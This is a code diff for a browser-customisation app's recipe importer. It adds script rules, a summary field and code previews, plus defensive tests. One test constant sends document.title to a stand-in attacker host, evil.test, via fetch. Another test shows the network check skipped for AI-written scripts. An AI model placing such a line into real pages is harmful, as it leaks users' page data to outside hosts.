@@ -1,4 +1,4 @@
-//! Recipes that come from outside the app: pasted bundles and marketplace downloads. Everything
+//! Recipes that come from outside the app: pasted bundles and the bundled library. Everything
 //! in them is the sender's claim, so the sender's `origin` and id prefix are
 //! replaced before validation, and the text that the review screen will show is checked for
 //! characters that could disguise it.
@@ -22,6 +22,7 @@ pub const MAX_RECIPE_BYTES: usize = 256 * 1024;
 const MAX_ID_CHARS: usize = 80;
 const MAX_NAME_CHARS: usize = 60;
 const MAX_AUTHOR_CHARS: usize = 60;
+pub const MAX_SUMMARY_CHARS: usize = 140;
 /// Equal to the Worker's `MAX_NOTES`: authors' research notes can be long.
 const MAX_NOTES_CHARS: usize = 4000;
 const MAX_OPTION_TEXT_CHARS: usize = 500;
@@ -32,11 +33,11 @@ const MAX_MATCH_PATTERNS: usize = 20;
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Source {
     /// A pasted bundle: the id is moved under `imported.` so it can never replace another
-    /// recipe, such as an installed marketplace one.
+    /// recipe, such as an installed library one.
     File,
-    /// A marketplace download, already checked against the signed catalog: the id must be
-    /// `market.` and is kept.
-    Catalog,
+    /// A recipe of the bundled library (official or community), or one about to be shared: the id
+    /// must be `market.` and is kept.
+    Bundled,
     /// One of our own saved files: the id must already be under `imported.` or `market.`.
     Stored,
 }
@@ -62,6 +63,8 @@ pub struct RecipePreview {
     /// The tabs of a hub, each with the site it opens; empty for an ordinary recipe.
     pub tabs: Vec<TabPreview>,
     pub rules: Vec<RulePreview>,
+    /// Whether any rule runs code on the pages.
+    pub runs_code: bool,
     /// The version already installed under this id, which saving would replace.
     pub replaces: Option<String>,
 }
@@ -89,6 +92,8 @@ pub struct RulePreview {
     pub kind: &'static str,
     pub selector: String,
     pub declarations: BTreeMap<String, String>,
+    /// The text of a script rule, shown in full so the user reads what would run.
+    pub code: Option<String>,
 }
 
 pub fn export_bundle(recipes: &[Recipe]) -> Result<String> {
@@ -160,9 +165,9 @@ fn shared_id(source: Source, id: &str) -> Result<String> {
     let id = match source {
         Source::File if id.starts_with(IMPORTED_PREFIX) => id.to_owned(),
         Source::File => format!("{IMPORTED_PREFIX}{id}"),
-        Source::Catalog if id.starts_with(MARKET_PREFIX) => id.to_owned(),
+        Source::Bundled if id.starts_with(MARKET_PREFIX) => id.to_owned(),
         Source::Stored if has_prefix => id.to_owned(),
-        Source::Catalog | Source::Stored => {
+        Source::Bundled | Source::Stored => {
             return Err(Error::Recipe(format!("recipe id {id} is not allowed here")));
         }
     };
@@ -198,6 +203,14 @@ fn check_shared(recipe: &Recipe) -> Result<()> {
         (meta.and_then(|m| m.author.as_deref()), MAX_AUTHOR_CHARS),
     ];
     let notes = meta.and_then(|m| m.notes.as_deref());
+    let summary = meta.and_then(|m| m.summary.as_deref());
+    if summary.is_some_and(|text| text.trim().is_empty() || !is_plain_text(text, MAX_SUMMARY_CHARS))
+    {
+        return Err(Error::Recipe(format!(
+            "recipe {} has a summary that is not 1 to {MAX_SUMMARY_CHARS} plain characters",
+            recipe.id
+        )));
+    }
     let unsafe_header = texts
         .into_iter()
         .any(|(text, limit)| text.is_some_and(|text| !is_plain_text(text, limit)));
@@ -212,7 +225,7 @@ fn check_shared(recipe: &Recipe) -> Result<()> {
         .iter()
         .flat_map(|option| [&option.label, &option.description]);
     let rule_labels = recipe.rules.iter().map(|rule| match rule {
-        Rule::Hide { label, .. } | Rule::Css { label, .. } => label,
+        Rule::Hide { label, .. } | Rule::Css { label, .. } | Rule::Script { label, .. } => label,
     });
     let tab_labels = recipe
         .hub
@@ -252,11 +265,6 @@ pub(crate) fn is_version(version: &str) -> bool {
         && parts.iter().all(|part| {
             !part.is_empty() && part.len() <= 4 && part.bytes().all(|b| b.is_ascii_digit())
         })
-}
-
-/// Whether an id may name a marketplace recipe.
-pub(crate) fn is_catalog_id(id: &str) -> bool {
-    shared_id(Source::Catalog, id).is_ok()
 }
 
 /// A favorite made from a recipe opens its homepage under the recipe's name, so a shared recipe
@@ -317,6 +325,10 @@ pub fn preview(recipe: &Recipe, installed_version: Option<&str>) -> RecipePrevie
             })
             .collect(),
         rules: recipe.rules.iter().map(rule_preview).collect(),
+        runs_code: recipe
+            .rules
+            .iter()
+            .any(|rule| matches!(rule, Rule::Script { .. })),
         tabs: tab_previews(recipe),
         replaces: installed_version.map(str::to_owned),
     }
@@ -345,6 +357,14 @@ fn rule_preview(rule: &Rule) -> RulePreview {
             kind: "hide",
             selector: target.css.clone(),
             declarations: BTreeMap::new(),
+            code: None,
+        },
+        Rule::Script { label, code, .. } => RulePreview {
+            label: label.clone(),
+            kind: "script",
+            selector: String::new(),
+            declarations: BTreeMap::new(),
+            code: Some(code.clone()),
         },
         Rule::Css {
             label,
@@ -356,6 +376,7 @@ fn rule_preview(rule: &Rule) -> RulePreview {
             kind: "css",
             selector: target.css.clone(),
             declarations: declarations.clone(),
+            code: None,
         },
     }
 }
@@ -434,7 +455,7 @@ mod tests {
             format!("{TAB_A},{blank}"),
             format!("{TAB_A},{long}"),
             format!("{TAB_A},{invisible}"),
-            vec![TAB_B; 7].join(","),
+            [TAB_B; 7].join(","),
         ] {
             assert!(file(&hub_of(&tabs)).is_err(), "{tabs}");
         }
@@ -491,13 +512,13 @@ mod tests {
     }
 
     #[test]
-    fn only_the_catalog_path_may_use_a_market_id() {
+    fn only_the_bundled_path_may_use_a_market_id() {
         let json = recipe_json("market.calm", "");
         assert_eq!(
-            parse_shared(json.as_bytes(), Source::Catalog).unwrap().id,
+            parse_shared(json.as_bytes(), Source::Bundled).unwrap().id,
             "market.calm"
         );
-        assert!(parse_shared(recipe_json("calm", "").as_bytes(), Source::Catalog).is_err());
+        assert!(parse_shared(recipe_json("calm", "").as_bytes(), Source::Bundled).is_err());
         assert!(parse_shared(recipe_json("custom.calm", "").as_bytes(), Source::Stored).is_err());
     }
 
@@ -535,6 +556,17 @@ mod tests {
     }
 
     #[test]
+    fn a_summary_is_one_to_140_plain_characters() {
+        let summary = |text: &str| format!(r#", "meta": {{"summary": "{text}"}}"#);
+        assert!(file(&recipe_json("calm", &summary("Hides the shorts shelf."))).is_ok());
+        assert!(file(&recipe_json("calm", &summary(""))).is_err());
+        assert!(file(&recipe_json("calm", &summary("  "))).is_err());
+        assert!(file(&recipe_json("calm", &summary(&"s".repeat(141)))).is_err());
+        assert!(file(&recipe_json("calm", &summary(&"s".repeat(140)))).is_ok());
+        assert!(file(&recipe_json("calm", &summary(r"one\ntwo"))).is_err());
+    }
+
+    #[test]
     fn notes_may_be_long_but_not_longer_than_the_cap() {
         let notes = |len: usize| format!(r#", "meta": {{"notes": "{}"}}"#, "n".repeat(len));
         assert!(file(&recipe_json("calm", &notes(MAX_NOTES_CHARS))).is_ok());
@@ -542,9 +574,7 @@ mod tests {
     }
 
     #[test]
-    fn script_rules_and_unknown_fields_are_refused() {
-        let script = recipe_json("calm", "").replace("\"type\": \"hide\"", "\"type\": \"script\"");
-        assert!(file(&script).is_err());
+    fn unknown_fields_are_refused() {
         assert!(file(&recipe_json("calm", ", \"extra\": 1")).is_err());
     }
 
@@ -589,5 +619,56 @@ mod tests {
         assert_eq!(preview.rules.len(), 1);
         assert_eq!(preview.rules[0].selector, ".shelf");
         assert_eq!(preview.rules[0].kind, "hide");
+    }
+
+    fn script_recipe(code: &str) -> String {
+        let code = serde_json::to_string(code).unwrap();
+        recipe_json("calm", "").replace(
+            r#""type": "hide", "option": "shorts",
+                            "target": {"css": ".shelf"}"#,
+            &format!(r#""type": "script", "option": "shorts", "code": {code}"#),
+        )
+    }
+
+    const CLEAN: &str = "for (const post of document.querySelectorAll('.post')) {\n  if (post.textContent.includes('Sponsored')) post.hidden = true;\n}";
+    const LEAKY: &str = "fetch('https://evil.test/?c=' + document.title);";
+
+    #[test]
+    fn an_imported_script_that_calls_fetch_is_refused_naming_the_finding() {
+        let text = file(&script_recipe(LEAKY)).unwrap_err().to_string();
+        assert!(text.contains("script rule r1 is refused"), "{text}");
+        assert!(text.contains("network at line 1"), "{text}");
+    }
+
+    #[test]
+    fn the_bundled_path_enforces_the_policy_too() {
+        let json = script_recipe(LEAKY).replace("\"calm\"", "\"market.calm\"");
+        assert!(parse_shared(json.as_bytes(), Source::Bundled).is_err());
+    }
+
+    #[test]
+    fn the_same_script_is_accepted_when_the_assistant_wrote_it() {
+        let json = script_recipe(LEAKY);
+        let mut recipe: Recipe = serde_json::from_str(&json).unwrap();
+        recipe.origin = Origin::Ai;
+        assert!(recipe.validate().is_ok());
+    }
+
+    #[test]
+    fn a_clean_script_is_accepted_when_imported_and_previewed_with_its_code() {
+        let recipe = file(&script_recipe(CLEAN)).unwrap();
+        let preview = preview(&recipe, None);
+        assert!(preview.runs_code);
+        assert_eq!(preview.rules[0].kind, "script");
+        assert_eq!(preview.rules[0].code.as_deref(), Some(CLEAN));
+        assert!(preview.rules[0].selector.is_empty());
+        assert!(!super::preview(&file(&recipe_json("calm", "")).unwrap(), None).runs_code);
+    }
+
+    #[test]
+    fn scripts_round_trip_through_a_bundle_unchanged() {
+        let recipe = file(&script_recipe(CLEAN)).unwrap();
+        let text = export_bundle(std::slice::from_ref(&recipe)).unwrap();
+        assert_eq!(parse_bundle(&text).unwrap(), vec![recipe]);
     }
 }
